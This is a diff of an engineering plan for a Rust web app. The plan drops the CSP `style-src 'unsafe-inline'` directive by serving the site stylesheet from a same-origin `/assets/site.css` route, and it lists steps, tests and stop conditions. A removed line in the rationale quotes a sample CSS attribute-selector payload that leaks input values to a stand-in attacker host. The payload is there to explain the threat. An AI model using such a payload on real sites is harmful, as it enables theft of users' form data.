@@ -1,4 +1,4 @@
-# Plan 029: Remove style-src 'unsafe-inline' — extend nonce to inline styles
+# Plan 029: Remove style-src 'unsafe-inline' by externalizing the site stylesheet
 
 > **Executor instructions**: Follow this plan step by step. Run every
 > verification command and confirm the expected result before moving to the
@@ -6,150 +6,191 @@
 > report — do not improvise. When done, update the status row for this plan
 > in `plans/README.md`.
 >
-> **Drift check (run first)**: `git diff --stat 0819727..HEAD -- src/http/security_headers.rs src/views/`
-> If any in-scope file changed, compare the "Current state" excerpts against
-> the live code; on a mismatch treat it as a STOP condition.
+> **Drift check (run first)**: `git diff --stat 0819727..HEAD -- src/http/security_headers.rs src/views/layout.rs src/http/assets.rs src/http/router.rs`
+> If any in-scope file changed, compare the "Current state" excerpts against the
+> live code; on a mismatch treat it as a STOP condition.
 
 ## Status
 
 - **Priority**: P2
 - **Effort**: M
 - **Risk**: MED
-- **Depends on**: plans/028-security-headers-hardening.md
+- **Depends on**: plans/028-security-headers-hardening.md (same CSP string in `security_headers.rs`)
 - **Category**: security
 - **Planned at**: commit `0819727`, 2026-06-26
 
 ## Why this matters
 
-The current CSP contains `style-src 'self' 'unsafe-inline'`. This means any `<style>` tag that appears in a rendered page — from a template, a custom theme, or future feature code — is automatically trusted by the browser. A CSS injection attack (e.g., attribute-selector oracle `input[value^="x"] { background-image: url(attacker.com/?c=x) }`) becomes possible if user-controlled content ever reaches a `<style>` context. Ammonia sanitizes user Markdown but does not prevent style injection from template-level code.
+The CSP contains `style-src 'self' 'unsafe-inline'`. `'unsafe-inline'` trusts any `<style>` block on the page — a CSS-injection / attribute-oracle vector if user-controlled content ever reaches a `<style>` context. The `script-src` directive is already nonce-locked; `style-src` should be equally strict.
 
-The nonce mechanism for `script-src` is already wired (`CspNonce` generated per-request, injected as an Axum extension, used in `<script nonce="…">` tags). Extending it to `style-src` means inline `<style>` blocks must carry the same per-request nonce or they are blocked by the browser — a second line of defence after Ammonia.
+**Key finding from the live code**: the ONLY inline style anywhere is a single static block in the shared layout — `<style>{STYLES}</style>` at `src/views/layout.rs:416`, where `STYLES` is a compile-time `const` (`layout.rs:101`) that is byte-identical on every page. There is no per-page inline style.
+
+The simplest correct fix is therefore **not** to thread a nonce through every page handler/view (that would touch 7–8 files because only the document view currently receives the CSP nonce). Instead, **externalize the static stylesheet**: serve `STYLES` from a same-origin route `GET /assets/site.css` and replace the inline `<style>` with a `<link rel="stylesheet">`. Then `style-src 'self'` covers it with **no** `'unsafe-inline'`, no nonce threading, and no hash to keep in sync. This mirrors how the font is already served (`src/http/assets.rs` — its module doc explicitly notes same-origin assets load "under the strict `default-src 'self'` CSP"). Bonus: the CSS becomes browser-cacheable across pages.
 
 ## Current state
 
-**`src/http/security_headers.rs`** — CSP format string (after plan 028 lands):
-```
-style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'
-```
-
-**`src/http/security_headers.rs:13–23`** — `CspNonce` struct:
+**`src/views/layout.rs:101`** — the style constant:
 ```rust
-pub struct CspNonce(String);
+const STYLES: &str = r#"
+... (large CSS block) ...
+"#;
+```
 
-impl CspNonce {
-    pub fn generate() -> Self {
-        Self(Uuid::new_v4().simple().to_string())
-    }
-    pub fn as_str(&self) -> &str { &self.0 }
+**`src/views/layout.rs:414-416`** — the inline `<style>` in the `<head>` (rendered on EVERY page):
+```rust
+    <link rel="preload" href="/assets/fonts/nunito.woff2" as="font" type="font/woff2" crossorigin />
+    <style>{}</style>{}
+```
+The first `{}` is filled by `STYLES`, the second `{}` by `extra_css` (the optional `INKWELL_CUSTOM_CSS_URL` `<link>`). See the `format!` args at `layout.rs:435-437` (`STYLES, extra_css, ...`).
+
+**`src/http/assets.rs`** — the exemplar pattern to copy (font handler):
+```rust
+pub async fn nunito_font() -> Response {
+    (
+        StatusCode::OK,
+        [
+            (header::CONTENT_TYPE, "font/woff2"),
+            (header::CACHE_CONTROL, "public, max-age=31536000, immutable"),
+        ],
+        NUNITO_WOFF2,
+    ).into_response()
 }
 ```
-The nonce is inserted into request extensions at `request.extensions_mut().insert(nonce.clone())` and retrieved by view templates via `Extension::<CspNonce>`.
 
-**`src/views/`** — HTML templates are Rust string formatting functions (no Askama/Tera). Search for `<style` in `src/views/` to find every inline style tag. Each one must gain a `nonce="…"` attribute.
+**`src/http/router.rs:95`** — the font route (add the CSS route next to it):
+```rust
+.route("/assets/fonts/nunito.woff2", get(assets::nunito_font))
+```
 
-**Convention** for templates: `src/views/layout.rs` is the shared layout entry. Any `<style>` tag in the layout affects every HTML page. Match the pattern used by `<script nonce="…">` tags.
+**`src/http/security_headers.rs:54`** — CSP (AFTER plan 028 lands, so `img-src` already has colons):
+```rust
+"default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; \
+ img-src 'self' http: https:; style-src 'self' 'unsafe-inline'; \
+ script-src 'self' 'nonce-{}'"
+```
 
 ## Commands you will need
 
 | Purpose    | Command                                              | Expected on success          |
 |------------|------------------------------------------------------|------------------------------|
-| Find style tags | `grep -rn '<style' src/views/`               | list of files + line numbers |
+| Find style tags | `grep -rn '<style' src/views/`                  | exactly one hit: `layout.rs` |
 | Typecheck  | `cargo check --all-targets`                          | exit 0                       |
-| Tests      | `cargo nextest run --test security_headers_contract` | all pass                     |
+| Tests      | `cargo nextest run --test security_headers_contract --test view_layout_contract` | all pass |
 | All tests  | `cargo nextest run`                                  | all pass                     |
 | Lint       | `cargo clippy --all-targets -- -D warnings`          | exit 0                       |
 
 ## Scope
 
 **In scope**:
-- `src/http/security_headers.rs` — change `style-src 'self' 'unsafe-inline'` to `style-src 'self' 'nonce-{nonce}'`
-- Every file in `src/views/` that emits a `<style>` tag — add `nonce="{nonce}"` attribute to each
-- `tests/security_headers_contract.rs` — update CSP assertion for style-src
+- `src/views/layout.rs` — make `STYLES` reachable by `assets.rs` (e.g. `pub(crate) const STYLES`), and replace the inline `<style>{}</style>` with `<link rel="stylesheet" href="/assets/site.css" />`
+- `src/http/assets.rs` — add a `site_css()` handler serving `STYLES` as `text/css`
+- `src/http/router.rs` — register `GET /assets/site.css`
+- `src/http/security_headers.rs` — change `style-src 'self' 'unsafe-inline'` to `style-src 'self'`
+- `tests/security_headers_contract.rs`, `tests/view_layout_contract.rs` — update/extend assertions
 
 **Out of scope**:
-- `src/rendering/` — Ammonia sanitizer strips `style` attributes from user Markdown; no change needed
-- `<link rel="stylesheet">` tags — those reference external files and do not need a nonce; `style-src 'self'` covers them
-- The `INKWELL_CUSTOM_CSS_URL` link tag — it is a stylesheet link, not an inline block; no nonce needed
+- `script-src` nonce logic — already correct; do not touch
+- The `INKWELL_CUSTOM_CSS_URL` `<link>` (`extra_css`) — it is already an external `<link>` covered by `style-src 'self'` only if same-origin; leaving the operator-supplied URL as-is is fine (a cross-origin custom CSS URL would need a separate `style-src` host allowance — note it, do not solve it here)
+- Any `src/rendering/` change — Ammonia already strips user `style` attributes
 
 ## Git workflow
 
-- Branch: `advisor/029-csp-style-nonce`
-- Commit: `fix(http): extend CSP nonce to style-src, remove unsafe-inline`
+- Branch: `advisor/029-externalize-stylesheet`
+- Commit: `security(http): serve site CSS as /assets/site.css and drop style-src 'unsafe-inline'`
 
 ## Steps
 
-### Step 1: Find all inline `<style>` tags in src/views/
+### Step 1: Confirm there is exactly one inline `<style>`
 
-Run: `grep -rn '<style' src/views/`
+Run `grep -rn '<style' src/views/`. Expect a single hit in `layout.rs` (the one at line 416). If there are more, STOP and report — this plan assumes a single static style block.
 
-List every file and line number. If there are zero results, the plan is trivially done — skip to Step 3 and just change the CSP string.
+**Verify**: one hit, in `layout.rs`.
 
-If there are results, proceed to Step 2 for each file found.
+### Step 2: Expose STYLES and add the site_css handler
 
-**Verify**: You have a complete list.
-
-### Step 2: Add nonce to each `<style>` tag
-
-For each `<style>` occurrence in `src/views/`, change:
-```html
-<style>
-```
-to:
-```html
-<style nonce="{nonce}">
-```
-where `{nonce}` is the value of `CspNonce` already available in the request extension.
-
-The nonce is already passed to views that need it (look for `CspNonce` parameter in the view function signatures). If a view does not currently receive the nonce, add it following the same pattern used by view functions that already receive it (look for `nonce: &CspNonce` or `nonce: &str` parameters in `src/views/layout.rs`).
-
-STOP condition: If a view has a `<style>` tag but the rendering function has no mechanism to receive the nonce and adding it requires touching more than 3 files. Report and stop.
-
-**Verify**: `grep -rn '<style' src/views/` shows all remaining `<style>` tags have a `nonce=` attribute.
-
-### Step 3: Update CSP style-src directive
-
-In `src/http/security_headers.rs`, change the CSP format string:
-
+1. In `src/views/layout.rs`, change `const STYLES: &str` to `pub(crate) const STYLES: &str` so `assets.rs` can serve it.
+2. In `src/http/assets.rs`, add a handler mirroring `nunito_font`:
 ```rust
-// Before (after plan 028):
-"... style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}' ..."
-
-// After:
-"... style-src 'self' 'nonce-{nonce}'; script-src 'self' 'nonce-{nonce}' ..."
+/// `GET /assets/site.css` — serve the site stylesheet same-origin so the page
+/// needs no inline <style> and the CSP can drop 'unsafe-inline' from style-src.
+pub async fn site_css() -> Response {
+    (
+        StatusCode::OK,
+        [
+            (header::CONTENT_TYPE, "text/css; charset=utf-8"),
+            // STYLES can change between releases, so do NOT mark immutable; a
+            // modest cache is enough (it is re-fetched at most hourly).
+            (header::CACHE_CONTROL, "public, max-age=3600"),
+        ],
+        crate::views::layout::STYLES,
+    ).into_response()
+}
 ```
-
-Note: the same nonce value appears for both `style-src` and `script-src`.
 
 **Verify**: `cargo check --all-targets` → exit 0
 
-### Step 4: Update tests
+### Step 3: Register the route
 
-In `tests/security_headers_contract.rs`, update any assertion that checks for `'unsafe-inline'` in `style-src` — it should now check for `'nonce-` instead. Add a test that loads a page HTML response and asserts `<style nonce="…">` is present (if there are any inline styles).
+In `src/http/router.rs`, add next to the font route (line ~95):
+```rust
+.route("/assets/site.css", get(assets::site_css))
+```
 
-**Verify**: `cargo nextest run --test security_headers_contract` → all pass
+**Verify**: `cargo check --all-targets` → exit 0
+
+### Step 4: Replace the inline `<style>` with a `<link>`
+
+In `src/views/layout.rs`, change the head markup at line 416 from:
+```rust
+    <style>{}</style>{}
+```
+to:
+```rust
+    <link rel="stylesheet" href="/assets/site.css" />{}
+```
+and remove `STYLES` from the `format!` argument list (the `format!` at lines ~435-437) — the first `{}` is gone, so drop the `STYLES,` argument; keep `extra_css` as the remaining trailing `{}`. Re-check the `format!` placeholder count matches the argument count after the edit (a mismatch is a compile error, which is the safety net).
+
+**Verify**: `cargo check --all-targets` → exit 0; `grep -rn '<style' src/views/` → no hits.
+
+### Step 5: Drop 'unsafe-inline' from the CSP
+
+In `src/http/security_headers.rs`, change `style-src 'self' 'unsafe-inline'` to `style-src 'self'` in the CSP format string. Leave everything else (including the `script-src` nonce) unchanged.
+
+**Verify**: `cargo check --all-targets` → exit 0; `grep -n "unsafe-inline" src/http/security_headers.rs` → no hits.
+
+### Step 6: Update tests
+
+1. `tests/security_headers_contract.rs` — the CSP assertion for `style-src` must change from `'self' 'unsafe-inline'` to `'self'` (no unsafe-inline). Update the expected substring.
+2. `tests/view_layout_contract.rs` — if any test asserts the page contains `<style>`, change it to assert the page contains `<link rel="stylesheet" href="/assets/site.css"` and does NOT contain `<style>`.
+3. Add a small test (in `security_headers_contract.rs` or `view_layout_contract.rs`, whichever has the router fixture) that `GET /assets/site.css` returns 200 with `content-type: text/css; charset=utf-8` and a non-empty body.
+
+**Verify**: `cargo nextest run --test security_headers_contract --test view_layout_contract` → all pass
 
 ## Test plan
 
-- Existing CSP tests updated: `style-src` no longer contains `'unsafe-inline'`, contains `'nonce-'`.
-- Integration test: `GET /` returns HTML where all `<style>` tags have a `nonce` attribute matching the `Content-Security-Policy` response header's nonce.
+- CSP no longer contains `'unsafe-inline'` in `style-src` (contract test updated).
+- `GET /assets/site.css` → 200, `text/css`, non-empty.
+- Rendered pages contain `<link rel="stylesheet" href="/assets/site.css">` and no `<style>` block.
 
 ## Done criteria
 
 - [ ] `cargo check --all-targets` exits 0
 - [ ] `cargo clippy --all-targets -- -D warnings` exits 0
 - [ ] `cargo fmt --check` exits 0
-- [ ] `cargo nextest run` exits 0; CSP style-src nonce test passes
-- [ ] `grep -rn "'unsafe-inline'" src/http/security_headers.rs` returns no matches
-- [ ] `grep -rn '<style[^n]' src/views/` returns no matches (all style tags have nonce)
+- [ ] `cargo nextest run` exits 0
+- [ ] `grep -rn '<style' src/views/` → no matches
+- [ ] `grep -n "unsafe-inline" src/http/security_headers.rs` → no matches
+- [ ] `GET /assets/site.css` route exists and is tested (200, text/css)
 - [ ] `plans/README.md` status row updated
 
 ## STOP conditions
 
-- A view renders `<style>` but has no path to receive the `CspNonce` extension without touching more than 3 files.
-- After removing `'unsafe-inline'`, a page's styles break visually (the nonce doesn't reach a tag).
-- `cargo check` fails after the CSP string change.
+- `grep -rn '<style' src/views/` finds more than one inline style block, or a style block that is NOT a single static const. The externalize approach assumes one static block; report and stop.
+- Removing `STYLES` from the `format!` argument list leaves a placeholder/argument count mismatch you cannot resolve (re-count `{}` vs args). Report.
+- A page visibly loses styling after the change (the `<link>` href is wrong or the route isn't registered). Re-check Steps 3-4.
 
 ## Maintenance notes
 
-- Every new `<style>` tag added to `src/views/` in the future must include `nonce="{nonce}"` — the verify checklist in `context/conventions.md` should be updated to include this rule.
-- The custom CSS URL (`INKWELL_CUSTOM_CSS_URL`) is a `<link>` element and requires no nonce — `style-src 'self'` covers external stylesheets from the same origin, and external URLs are covered by `style-src 'self' 'nonce-…'` only if you also add the external host — this is intentionally not done; third-party CSS should not be auto-trusted.
+- `STYLES` now ships via `GET /assets/site.css`. Editing `STYLES` requires no CSP change (that was the whole point of avoiding a hash). The 1-hour cache means a style change can take up to an hour to appear for a returning visitor; bump to a content-hashed URL later if instant invalidation is needed.
+- Any FUTURE inline `<style>` added to a view would be blocked by `style-src 'self'`. The rule: site styles go in `STYLES` (served via the route); never add an inline `<style>` tag. Add this to the `context/conventions.md` verify checklist.
+- A cross-origin `INKWELL_CUSTOM_CSS_URL` would be blocked by `style-src 'self'`. If custom external CSS must be supported, add that host to `style-src` from config — a separate, deliberate change.
